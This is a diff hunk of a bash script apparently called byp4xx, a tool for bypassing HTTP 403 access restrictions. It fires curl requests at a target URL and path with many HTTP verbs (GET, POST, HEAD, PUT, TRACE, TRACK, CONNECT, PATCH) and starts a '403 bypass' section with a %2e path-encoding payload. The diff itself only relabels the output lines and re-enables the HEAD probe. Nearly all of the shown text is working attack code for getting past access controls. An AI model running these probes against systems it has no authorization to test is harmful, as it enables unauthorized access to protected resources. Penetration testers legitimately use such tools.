@@ -1,16 +1,16 @@
 #!/bin/bash
 echo "Usage: ./byp4xx http(s)://url /path"
 echo "----HTTP Verb Tampering----"
-echo "Regular GET request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X GET $1$2)
+echo "GET request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X GET $1$2)
 echo "POST request: "$(curl -k -s -o /dev/null -w "%{http_code}" -H "Content-Length:0" -X POST $1$2)
-#echo "Regular HEAD request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X HEAD $1$2)
-echo "Regular OPTIONS request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X OPTIONS $1$2)
-echo "Regular PUT request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X PUT $1$2)
-#echo "Regular DELETE request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X DELETE $1$2)
-echo "Regular TRACE request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X TRACE $1$2)
-echo "Regular TRACK request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X TRACK $1$2)
-echo "Regular CONNECT request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X CONNECT $1$2)
-echo "Regular PATCH request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X PATCH $1$2)
+echo "HEAD request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X HEAD $1$2)
+echo "OPTIONS request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X OPTIONS $1$2)
+echo "PUT request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X PUT $1$2)
+#echo "DELETE request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X DELETE $1$2)
+echo "TRACE request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X TRACE $1$2)
+echo "TRACK request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X TRACK $1$2)
+echo "CONNECT request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X CONNECT $1$2)
+echo "PATCH request: "$(curl -k -s -o /dev/null -w "%{http_code}" -X PATCH $1$2)
 echo
 echo "----403 bypass methods----"
 echo "%2e payload: "$(curl -k -s -o /dev/null -w "%{http_code}" -X GET $1/%2e$2)
